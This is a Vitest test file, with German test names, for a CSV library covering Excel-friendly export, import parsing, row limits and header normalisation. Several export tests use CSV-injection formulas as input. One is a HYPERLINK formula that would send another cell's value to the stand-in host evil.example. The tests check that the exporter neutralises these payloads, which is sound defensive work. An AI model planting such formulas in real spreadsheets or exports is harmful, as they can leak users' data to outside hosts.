import { describe, expect, it } from "vitest";
import { CSV_MAX_ROWS, CsvError, normalizeHeader, parseCsv, toCsv } from "@/lib/csv";

describe("CSV-Export", () => {
  it("nutzt Semikolon, Windows-Zeilenenden und UTF-8-BOM (Excel-tauglich)", () => {
    const csv = toCsv(["Vorname", "Nachname"], [["Jörg", "Müller"]]);
    expect(csv.startsWith("﻿")).toBe(true);
    expect(csv).toContain("Vorname;Nachname\r\nJörg;Müller");
  });

  it("maskiert Trennzeichen, Anführungszeichen und Zeilenumbrüche", () => {
    const csv = toCsv(["a"], [['Er sagte "Hallo"; dann ging er'], ["Zeile1\nZeile2"]]);
    expect(csv).toContain('"Er sagte ""Hallo""; dann ging er"');
    expect(csv).toContain('"Zeile1\nZeile2"');
  });

  it("schützt vor CSV-Injection: Formeln werden entschärft", () => {
    const evil = [
      '=HYPERLINK("http://evil.example","x")',
      "+SUMME(A1)",
      "-2+3",
      "@cmd",
      "\tTab",
      "\rCR",
    ];
    const csv = toCsv(
      ["Notiz"],
      evil.map((value) => [value]),
    );
    const dataLines = csv.split("\r\n").slice(1).join("\n");
    // Jede gefährliche Zelle beginnt mit einem vorangestellten Hochkomma (evtl. in Anführungszeichen).
    for (const cell of evil) {
      const start = cell[0]!; // auch Tab und Zeilenumbruch sind gefährliche Anfangszeichen
      expect(
        dataLines.includes(`'${start}`) || dataLines.includes(`"'${start}`),
        JSON.stringify(cell),
      ).toBe(true);
    }
    expect(dataLines).not.toMatch(/(^|\n)=/);
    expect(dataLines).not.toMatch(/(^|\n)@/);
  });

  it("entschärft Formeln auch dann, wenn die Zelle einen Zeilenumbruch enthält", () => {
    const csv = toCsv(
      ["Vorname"],
      [['=HYPERLINK("https://evil.example/?"&E2&"\n";"Info")'], ["+1\r\n2"], ["@x\ny"]],
    );
    expect(csv).toContain("\"'=HYPERLINK(");
    expect(csv).toContain('"\'+1\r\n2"');
    expect(csv).toContain('"\'@x\ny"');
  });

  it("lässt normale Zahlen und Texte mit Bindestrich mitten im Text unverändert", () => {
    const csv = toCsv(["a", "b", "c"], [["Müller-Lüdenscheidt", 42, "a=b"]]);
    expect(csv).toContain("Müller-Lüdenscheidt;42;a=b");
  });

  it("gibt Leerwerte als leere Zellen aus", () => {
    expect(toCsv(["a", "b", "c"], [[null, undefined, "x"]])).toContain(";;x");
  });
});

describe("CSV-Import (parseCsv)", () => {
  it("erkennt Semikolon, Komma und Tab als Trennzeichen", () => {
    for (const delimiter of [";", ",", "\t"]) {
      const parsed = parseCsv(
        `Vorname${delimiter}Nachname\nAnna${delimiter}Muster\nBen${delimiter}Beispiel`,
      );
      expect(parsed.header).toEqual(["Vorname", "Nachname"]);
      expect(parsed.rows).toEqual([
        ["Anna", "Muster"],
        ["Ben", "Beispiel"],
      ]);
    }
  });

  it("entfernt das BOM und ignoriert Leerzeilen", () => {
    const parsed = parseCsv("﻿Vorname;Nachname\n\nAnna;Muster\n\n");
    expect(parsed.header[0]).toBe("Vorname");
    expect(parsed.rows).toHaveLength(1);
  });

  it("liest Anführungszeichen, Semikolons und Zeilenumbrüche innerhalb von Zellen", () => {
    const parsed = parseCsv('Name;Notiz\n"Meier; Hans";"Zeile1\nZeile2"');
    expect(parsed.rows[0]).toEqual(["Meier; Hans", "Zeile1\nZeile2"]);
  });

  it("begrenzt Dateigröße und Zeilenanzahl", () => {
    expect(() => parseCsv("a".repeat(1_000_001))).toThrow(CsvError);
    const many = `a;b\n${Array.from({ length: CSV_MAX_ROWS + 1 }, () => "1;2").join("\n")}`;
    expect(() => parseCsv(many)).toThrow(/zu viele Zeilen/);
  });

  it("nennt je Datenzeile die Zeilennummer in der Datei – auch nach Leerzeilen und mehrzeiligen Zellen", () => {
    expect(parseCsv('\nKopf;X\n\nA;B\n\n"C\nC2";D\n  \nE;F\n').lines).toEqual([4, 6, 9]);
    expect(parseCsv('a;b\r\nc;"x\r\ny"\r\n\r\ne;f').lines).toEqual([2, 5]);
    expect(parseCsv("a;b\rc;d\r\re;f").lines).toEqual([2, 4]);
    expect(parseCsv("Vorname;Nachname\nAnna;Muster").lines).toEqual([2]);
  });

  it("weist leere Dateien ab", () => {
    expect(() => parseCsv("")).toThrow(CsvError);
  });

  it("nimmt das Hochkomma des Formelschutzes wieder ab: Export und Import passen zusammen", () => {
    const values = [
      "+49 171 1234567",
      "-Bindestrich vorn",
      "=1+1\nzweite Zeile",
      "@Verein",
      "'normal mit Hochkomma",
      "Müller-Lüdenscheidt",
    ];
    const parsed = parseCsv(
      toCsv(
        ["Wert"],
        values.map((value) => [value]),
      ),
    );
    expect(parsed.rows.map((row) => row[0])).toEqual(values);
  });

  it("entfernt nur ein einzelnes Hochkomma vor einem Formelzeichen", () => {
    const parsed = parseCsv("a;b;c;d\n'+49 171;''=x;'Text;x'+y");
    expect(parsed.rows[0]).toEqual(["+49 171", "''=x", "'Text", "x'+y"]);
  });
});

describe("normalizeHeader", () => {
  it("vereinheitlicht Spaltennamen", () => {
    expect(normalizeHeader("E-Mail")).toBe("email");
    expect(normalizeHeader(" Straße ")).toBe("strasse");
    expect(normalizeHeader("Geburtsdatum (TT.MM.JJJJ)")).toBe("geburtsdatumttmmjjjj");
    expect(normalizeHeader("Größe")).toBe("groesse");
  });
});
